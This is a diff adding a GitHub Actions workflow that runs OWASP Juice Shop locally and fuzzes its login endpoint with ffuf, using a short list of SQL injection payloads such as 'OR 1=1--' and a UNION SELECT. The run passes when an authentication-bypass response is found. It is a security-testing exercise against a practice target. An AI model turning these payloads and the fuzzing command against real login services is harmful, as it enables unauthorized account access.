@@ -1,0 +1,108 @@
+
+name: Juice Shop SQLi Fuzzing
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  fuzz:
+    name: FFUF SQL Injection Scan
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Start OWASP Juice Shop
+        run: |
+          docker run -d \
+            --name juice-shop \
+            -p 127.0.0.1:3000:3000 \
+            bkimminich/juice-shop
+
+      - name: Wait for Juice Shop
+        run: |
+          for i in $(seq 1 60); do
+            if curl -fsS http://127.0.0.1:3000/ \
+              -o /dev/null; then
+              echo "Juice Shop is ready"
+              exit 0
+            fi
+            sleep 3
+          done
+          docker logs juice-shop
+          exit 1
+
+      - name: Install ffuf
+        run: |
+          go install github.com/ffuf/ffuf/v2@latest
+          echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"
+
+      - name: Prepare SQLi payloads
+        run: |
+          mkdir -p reports
+
+          cat > reports/sqli-payloads.txt <<'EOF'
+          ' OR 1=1--
+          ' OR 1=1-- 
+          ' OR '1'='1'--
+          ' OR 1=1/*
+          admin@juice-sh.op'--
+          ' UNION SELECT 1--
+          ' OR 1=2--
+          ' OR sqlite_version() IS NOT NULL--
+          EOF
+
+      - name: Run ffuf SQLi fuzzing
+        run: |
+          ffuf \
+            -u http://127.0.0.1:3000/rest/user/login \
+            -X POST \
+            -H "Content-Type: application/json" \
+            -d '{"email":"FUZZ","password":"invalid-password"}' \
+            -w reports/sqli-payloads.txt \
+            -mc all \
+            -mr '"authentication"\s*:' \
+            -t 1 \
+            -rate 5 \
+            -timeout 10 \
+            -of json \
+            -o reports/ffuf-results.json
+
+      - name: Verify scan results
+        run: |
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+
+          report = Path("reports/ffuf-results.json")
+          data = json.loads(report.read_text())
+          results = data.get("results", [])
+
+          summary = (
+              f"SQL Injection scan\n"
+              f"Matching responses: {len(results)}\n"
+              f"Target: local OWASP Juice Shop\n"
+          )
+
+          Path("reports/summary.txt").write_text(summary)
+          print(summary)
+
+          if not results:
+              raise SystemExit(
+                  "No authentication bypass candidates found"
+              )
+          PY
+
+      - name: Upload security reports
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Security-repots-bundle
+          path: reports/
+          if-no-files-found: warn
+          retention-days: 7
